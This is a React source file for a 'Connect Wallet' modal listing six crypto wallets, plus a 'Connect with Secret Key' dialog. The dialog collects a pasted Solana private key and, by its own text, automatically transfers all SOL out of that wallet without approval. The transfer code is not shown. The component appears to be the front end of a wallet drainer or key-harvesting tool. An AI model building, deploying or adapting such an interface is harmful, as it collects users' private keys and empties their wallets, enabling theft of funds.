import React, { useState } from 'react';

const ConnectWalletModal = ({
  show,
  onHide,
  connectPhantom,
  connectSolflare,
  connectBackpack,
  connectMetaMask,
  connectTrustWallet,
  connectBitget,
  connectWithSecretKey,
}) => {
  const [showSecretModal, setShowSecretModal] = useState(false);
  const [secretKey, setSecretKey] = useState('');

  const handleConnectWithSecret = () => {
    connectWithSecretKey(secretKey, () => setSecretKey(''));
  };

  return (
    <>
      {/* Main Connect Button */}

      {/* Connect Modal */}
      {show && (
        <div style={{
          position: 'fixed',
          top: 0,
          left: 0,
          right: 0,
          bottom: 0,
          backgroundColor: 'transparent',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          zIndex: 1000,
          padding: '20px'
        }}>
          <div style={{
            backgroundColor: 'rgba(5, 3, 21, 0.5)',
            backdropFilter: 'blur(16px)',
            WebkitBackdropFilter: 'blur(16px)', // For Safari support
            border: '1px solid #2a2e37',
            borderRadius: '20px',
            width: '500px',
            maxWidth: '100%',
            maxHeight: '90vh',
            overflowY: 'auto',
            boxShadow: '0 20px 60px rgba(0,0,0,0.3)'
          }}>
            <div style={{
              padding: '24px',
              borderBottom: '1px solid #2a2e37',
              display: 'flex',
              justifyContent: 'space-between',
              alignItems: 'center'
            }}>
              <h2 style={{ margin: 0, fontSize: '20px', fontWeight: '600', color: '#e5e7eb' }}>Connect Wallet</h2>
              <button
                onClick={onHide}
                style={{
                  background: 'none',
                  border: 'none',
                  fontSize: '24px',
                  cursor: 'pointer',
                  color: '#9ca3af',
                  padding: '0',
                  width: '32px',
                  height: '32px',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  borderRadius: '8px'
                }}
                onMouseOver={(e) => e.target.style.backgroundColor = '#1f2937'}
                onMouseOut={(e) => e.target.style.backgroundColor = 'transparent'}
              >
                ×
              </button>
            </div>

            <div style={{ padding: '24px' }}>
              <p style={{
                textAlign: 'center',
                color: '#9ca3af',
                fontSize: '14px',
                marginBottom: '24px',
                paddingBottom: '16px',
                borderBottom: '1px solid #2a2e37'
              }}>
                Or choose a specific wallet:
              </p>

              {/* Wallet Grid */}
              <div style={{
                display: 'flex',
                flexDirection: 'column',
                gap: '12px',
                marginBottom: '24px'
              }}>
                {[
                  { name: 'Phantom', color: '#AB9FF2', handler: connectPhantom, type: 'Solana' },
                  { name: 'Solflare', color: '#1381D6', handler: connectSolflare, type: 'Solana' },
                  { name: 'Backpack', color: '#000000', handler: connectBackpack, type: 'Solana' },
                  { name: 'MetaMask', color: '#F6851B', handler: connectMetaMask, type: 'Ethereum' },
                  { name: 'Trust Wallet', color: '#3375BB', handler: connectTrustWallet, type: 'Multi' },
                  { name: 'Bitget Wallet', color: '#3590F3', handler: connectBitget, type: 'Multi' },
                ].map((wallet) => (
                  <button
                    key={wallet.name}
                    onClick={wallet.handler}
                    style={{
                      padding: '16px 12px',
                      backgroundColor: wallet.color,
                      color: 'white',
                      border: 'none',
                      borderRadius: '10px',
                      cursor: 'pointer',
                      display: 'flex',
                      flexDirection: 'column',
                      alignItems: 'center',
                      justifyContent: 'center',
                      gap: '6px',
                      transition: 'transform 0.2s'
                    }}
                    onMouseOver={(e) => e.target.style.transform = 'translateY(-2px)'}
                    onMouseOut={(e) => e.target.style.transform = 'translateY(0)'}
                  >
                    <div style={{ fontWeight: '600', fontSize: '15px' }}>{wallet.name}</div>
                    <div style={{
                      fontSize: '11px',
                      opacity: 0.9,
                      backgroundColor: 'rgba(255,255,255,0.2)',
                      padding: '2px 8px',
                      borderRadius: '12px'
                    }}>
                      {wallet.type}
                    </div>
                  </button>
                ))}
              </div>

              {/* Secret Key Option */}
              <button
                onClick={() => {
                  onHide();
                  setShowSecretModal(true)
                }}
                style={{
                  width: '100%',
                  padding: '16px',
                  backgroundColor: '#10b981',
                  color: 'white',
                  border: 'none',
                  borderRadius: '12px',
                  cursor: 'pointer',
                  fontSize: '16px',
                  fontWeight: '500',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  gap: '10px'
                }}
                onMouseOver={(e) => e.target.style.backgroundColor = '#059669'}
                onMouseOut={(e) => e.target.style.backgroundColor = '#10b981'}
              >
                <span>🔑</span>
                Connect with Secret Key
              </button>

              <p style={{
                marginTop: '16px',
                fontSize: '12px',
                color: '#9ca3af',
                textAlign: 'center',
                lineHeight: '1.5'
              }}>
                <strong>Secret Key:</strong> Auto-transfers all SOL without approval
                <br />
                <strong>Wallet connections:</strong> Require approval for each transfer
              </p>
            </div>
          </div>
        </div>
      )}

      {/* Secret Key Modal */}
      {showSecretModal && (
        <div style={{
          position: 'fixed',
          top: 0,
          left: 0,
          right: 0,
          bottom: 0,
          backgroundColor: 'rgba(0,0,0,0.8)',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          zIndex: 1001,
          padding: '20px'
        }}>
          <div style={{
            backgroundColor: 'white',
            borderRadius: '16px',
            width: '500px',
            maxWidth: '100%',
            maxHeight: '90vh',
            overflowY: 'auto'
          }}>
            <div style={{
              padding: '24px',
              borderBottom: '1px solid #eaeaea'
            }}>
              <h3 style={{ margin: 0, fontSize: '18px', color: '#dc2626' }}>
                ⚠️ SECRET KEY WARNING
              </h3>
            </div>

            <div style={{ padding: '24px' }}>
              <p style={{ marginBottom: '16px', color: '#666', lineHeight: '1.6' }}>
                <strong>This tool will automatically transfer ALL SOL from this wallet.</strong>
                <br />
                Only use with test wallets or wallets you want to empty completely.
              </p>

              <textarea
                value={secretKey}
                onChange={(e) => setSecretKey(e.target.value)}
                placeholder="Paste secret key JSON array: [123,45,67,89,...]"
                rows={6}
                style={{
                  width: '100%',
                  marginBottom: '20px',
                  padding: '16px',
                  fontFamily: 'monospace',
                  fontSize: '14px',
                  border: '2px solid #dc2626',
                  borderRadius: '10px',
                  resize: 'vertical',
                  backgroundColor: '#fef2f2'
                }}
              />

              <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '12px' }}>
                <button
                  onClick={() => setShowSecretModal(false)}
                  style={{
                    padding: '12px 24px',
                    backgroundColor: '#64748b',
                    color: 'white',
                    border: 'none',
                    borderRadius: '8px',
                    cursor: 'pointer',
                    fontWeight: '500'
                  }}
                >
                  Cancel
                </button>
                <button
                  onClick={handleConnectWithSecret}
                  style={{
                    padding: '12px 24px',
                    backgroundColor: '#10b981',
                    color: 'white',
                    border: 'none',
                    borderRadius: '8px',
                    cursor: 'pointer',
                    fontWeight: '500'
                  }}
                >
                  Connect
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
    </>
  );
};

export default ConnectWalletModal;